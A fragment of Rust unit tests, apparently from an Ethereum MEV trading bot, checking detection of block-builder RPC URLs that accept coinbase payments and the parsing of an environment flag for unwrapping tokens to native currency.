    fn test_coinbase_bribe_route_detection_is_builder_scoped() {
        assert!(is_coinbase_bribe_builder_url("https://rpc.beaverbuild.org"));
        assert!(is_coinbase_bribe_builder_url(
            "https://rpc.titanbuilder.xyz"
        ));
        assert!(!is_coinbase_bribe_builder_url(
            "https://relay.flashbots.net"
        ));

        let known = vec![
            "https://relay.flashbots.net".to_string(),
            "https://rpc.titanbuilder.xyz".to_string(),
        ];
        let unknown = vec!["https://relay.flashbots.net".to_string()];
        assert!(has_coinbase_bribe_route(&known));
        assert!(!has_coinbase_bribe_route(&unknown));
    }

    #[test]
    fn test_dumper_unwrap_to_native_env_defaults_and_parses() {
        let _guard = ENV_LOCK.lock().expect("env lock");
        let key = "DUMPER_UNWRAP_TO_NATIVE";
        let old = std::env::var(key).ok();

        std::env::remove_var(key);
        assert!(load_dumper_unwrap_to_native());
        std::env::set_var(key, "false");
        assert!(!load_dumper_unwrap_to_native());
        std::env::set_var(key, "true");
        assert!(load_dumper_unwrap_to_native());

        match old {
            Some(v) => std::env::set_var(key, v),
            None => std::env::remove_var(key),
        }
    }
}
